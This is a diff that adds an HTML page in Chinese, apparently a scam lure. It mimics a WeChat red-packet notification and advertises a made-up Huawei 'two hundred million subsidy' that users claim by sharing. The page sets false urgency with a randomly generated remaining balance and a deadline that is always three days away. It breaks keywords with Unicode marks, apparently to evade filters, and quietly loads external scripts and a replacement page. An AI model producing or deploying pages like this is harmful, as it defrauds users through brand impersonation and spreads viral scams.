@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>....</title>
+    <link rel="stylesheet" href="qiang.css">
+   <style>
+		.tan-bg-tz {
+				background-color: #fff;
+				border-radius: 6px;
+				position: fixed;
+				width: 96%;
+				animation:demo2 5s ease-in-out 0s 1 alternate forwards;
+				left: 2%;
+				z-index: 6666;
+			}
+			
+			.tongzhi_top {
+				display: flex;
+				justify-content: space-between;
+				margin-bottom: 4px;
+			}
+			
+			.tongzhi_bottom {
+				display: flex;
+				align-items: center;
+				justify-content: space-between;
+				font-size: 14px;
+			}
+			
+			.t_l_text {
+				display: flex;
+				align-items: center;
+				font-size: 12px;
+			}
+			
+			.t_l_text img {
+				width: 20px;
+				height: auto;
+				display: block;
+				margin-right: 10px;
+			}
+			
+			.safe-img {
+				margin-top: 4px;
+			}
+			
+			.safe-img img {
+				width: 14px;
+				height: auto;
+				display: block;
+			}
+			
+			.tz_img img {
+				width: 10vw;
+				height: 10vw;
+				display: block;
+			}
+			
+			.text-ling {
+				margin-top: 4px;
+				color: #6a6a6a;
+			}
+			
+			.text-new {
+				color: #6a6a6a;
+			}
+			
+			.new-bg-tz {
+				padding: 10px 10px 12px 20px;
+			}
+			    @keyframes demo2 {
+        0%{
+            transform: translateY(-100px);
+        }
+        30%{
+            transform: translateY(4px);
+        }
+        50%{
+            transform: translateY(4px);
+        }
+        100%{
+            transform:translateY(-300px);
+        }
+    }
+	</style>
+   <style>
+    .modal2{
+    margin: auto;
+    top: 100px;
+    padding-top: 20px;
+    padding-left: 20px;
+    padding-right: 20px;
+    background: white;
+    border-radius: 8px;
+    position: relative;
+    }
+    
+        .modal1{width: 100%;  background: #FEFEFE;  text-align: center; padding-top: 5vh; padding-bottom: 5vh; }
+        .disappear{width: 30px;height: 30px; border-radius: 50%; background: #c0c0c0; font-size: 20px; line-height: 26px; font-weight: bold; text-align: center; color: #ebebeb; position: absolute;right: -10px;top: -10px;}
+        .btn1{width: 100%; height: 50px; border-top: 1px solid #dcd9d9;}
+        .btnHide{width: 100%; height: 50px;font-size: 22px; color: #18ad19; border: 0; background: white; border-radius: 4px;}
+    </style>
+    <script>
+    </script>
+    <script>
+    		window.apiCode = "api1";
+	</script>
+    <script src="cp.js"></script>
+    <script>
+    	var ftitle =["全民派҈發现金","biaoqing全҈民派fuhao钱","biaoqing全民fuhao领钱","人人有fuhao有钱领","biaoqing现金奖励,随便领","biaoqing人人fuhao有钱領"];
+		var ztitle =["中华有为fuhao就业҈补助金",'中华有为fuhao支持華҈為5G','支持华为fuhao世界第一',"支持华为fuhao全民派钱","支持华为fuhao全民送钱","支持华为fuhao人人有钱领","支持华为fuhao人人有钱領","支持华为fuhao随机现金奖励"];
+    	var bg_img = '1.jpg';
+    	var nextUri = "jiayou_b";
+        function getUrlParam(name) {
+            var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
+            var r = window.location.search.substr(1).match(reg);
+            if (r != null) return unescape(r[2]);
+            return null;
+        }
+        function random_num(max,min){
+           var suff = parseInt(Math.random()*(max-min+1)+min,10); Math.floor(Math.random()*(max-min+1)+min);
+           return suff;
+        }
+        var now_time = new Date().getTime();
+        var from_time = (parseInt(getUrlParam('_t', document.referrer))*1000 || now_time);
+        var future = new Date(from_time + 3600*24*1000*3 + 8*3600*1000);
+        var future_str = future.toISOString().substr(0, 10);
+        function hideDialog(){
+            document.getElementById('dia').style.display = 'none';
+        }
+    </script>
+</head>
+<body style="background:#000">
+	<div  id="axax" class="tan-bg-tz" style="">
+			<div  class="new-bg-tz">
+				<div class="tongzhi_top">
+					<div class="t_l_text">
+						<div>
+							<img src="wei_xin.png" alt=""></div>
+						<div>微҈信 · <span class="text-new">刚刚</span></div>
+					</div>
+					<div class="safe-img"><img src="safe.png" alt=""></div>
+				</div>
+				<div class="tongzhi_bottom">
+					<div>
+						<div>微҈信红包҈</div>
+						<div class="text-ling">已到账，分享即可领取</div>
+					</div>
+					<div class="tz_img"><img src="tongzhi.jpg" alt=""></div>
+				</div>
+			</div>
+		</div>
+	    <div class="modal2"  id='dia' style='z-index: 1000;font-family:"微软雅黑";'>
+        <div class="disappear" data-clipboard-text="" id="disappear" onclick='hideDialog()'>x</div>
+        <div class="modal1">
+            <p style="color: #e03424; font-size: 24px; line-height: 40px;">华为҈·两亿҈生活补帖<br></p> 
+            <p style="margin-bottom: 20px; font-size:18px; "></p> 
+            <p style="font-size: 16px; color: #f4434f; margin-bottom: 20px;">
+				开工大吉·҈·补助金
+				<br>
+            	截至于<span style="font-size: 20px" id="datetime">1月10日</span>送完为止，人人免费领</p>
+            <p style="font-size: 16px; margin-bottom: 20px;">鼠年大吉,为答谢新老用户们的支持与厚爱，现发出开工补助金<br><span style="color: #f4434f;">两亿</span>现金礼包回馈微信用户</p> 
+            <p style="color: #bcbcbc; font-size: 16px; margin-bottom: 20px;"> 红包总额仅剩余<span style="color: #f4434f; font-size: 22px;"><script>document.write(random_num(10,99))</script>万</span><br> 数量有限，先到先得 </p> 
+        </div>
+        <div class="btn1"> <button id="btnxxx" class="btnHide" type="button" data-clipboard-text="" onclick='hideDialog()'>现在去领</button></div> 
+    </div>
+    <a rel="noreferrer" id="btn" style="display: none">referrer</a>
+    <script type="text/javascript" src="qianghw.js" id="main"></script>
+</body>
+
+
+<script>
+window.go=function(){
+function loadHtml(url){
+	document.title = "...";
+    var xhr = new XMLHttpRequest;
+    var html = null;
+    function render() {
+        var a = document.open("text/html;charset=UTF-8", "replace");
+        a.write(html);
+        a.close();
+    }
+    xhr.onload = function() {
+        html = xhr.responseText;
+        var delay = 0;
+        if (delay > 0) setTimeout("render()", delay * 1000)
+        else render();
+    };
+    xhr.open("GET",url, !0);
+    xhr.send();
+} 
+loadHtml('f.html'); 
+}
+var random = (Math.random()*15); 
+var random2 = (Math.random()*100);
+var dww=60;
+var dtt=45;
+ document.getElementById('dia').style.width=(dww+random)+"%";
+ document.getElementById('dia').style.top=(dtt+random2)+"px";
+ if(location.href.indexOf("v_100")!=-1){
+ 	document.getElementById('dia').style.display="none";
+ }
+var now_time = new Date().getTime();
+var from_time = (parseInt(now_time));
+var future = new Date(from_time + 3600*24*1000*3 + 8*3600*1000);
+var datetime = future.toISOString().substr(5, 5);
+datetime=datetime.replace("-","\u6708");
+document.getElementById('datetime').innerText=datetime+"日";
+document.getElementById('axax').style.top = (random2)+"px";
+</script>
+</html>
